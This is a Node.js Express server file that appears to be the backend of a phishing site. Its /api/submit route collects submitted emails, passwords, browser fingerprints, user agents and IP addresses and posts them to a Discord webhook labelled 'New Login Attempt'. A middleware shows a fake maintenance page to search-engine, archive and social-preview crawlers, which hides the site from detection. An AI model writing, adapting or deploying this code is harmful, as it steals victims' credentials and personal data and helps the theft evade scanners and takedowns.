import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Bot detection middleware
  const botUserAgents = [
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandexbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'rogerbot', 
    'exabot', 'mj12bot', 'facebot', 'facebookexternalhit', 'ia_archiver'
  ];

  app.use((req, res, next) => {
    const ua = req.headers['user-agent']?.toLowerCase() || '';
    const isBot = botUserAgents.some(bot => ua.includes(bot));

    if (isBot) {
      // Serve a generic maintenance page for bots
      return res.status(503).send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>System Maintenance</title>
          <style>
            body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; color: #333; }
            h1 { font-size: 40px; }
            p { font-size: 20px; }
          </style>
        </head>
        <body>
          <h1>System Maintenance</h1>
          <p>We are currently performing scheduled maintenance. Please check back later.</p>
        </body>
        </html>
      `);
    }
    next();
  });

  // API routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  app.post("/api/submit", async (req, res) => {
    const { email, password, fingerprint, theme } = req.body;
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      console.error("DISCORD_WEBHOOK_URL is not set");
      return res.status(200).json({ status: "ok", message: "Simulated success (no webhook)" });
    }

    try {
      const payload = {
        embeds: [
          {
            title: "New Login Attempt",
            color: 0xff4b33,
            fields: [
              { name: "Email", value: email || "N/A", inline: true },
              { name: "Password", value: password || "N/A", inline: true },
              { name: "Theme", value: theme || "Default", inline: true },
              { name: "Fingerprint", value: `\`\`\`${fingerprint || "N/A"}\`\`\`` },
              { name: "User Agent", value: req.headers['user-agent'] || "N/A" },
              { name: "IP", value: req.ip || "N/A" }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      res.json({ status: "ok" });
    } catch (error) {
      console.error("Error submitting to Discord:", error);
      res.status(500).json({ error: "Failed to submit" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    // Serve static files in production
    app.use(express.static(path.join(__dirname, "dist")));
    app.get("*", (req, res) => {
      res.sendFile(path.join(__dirname, "dist", "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
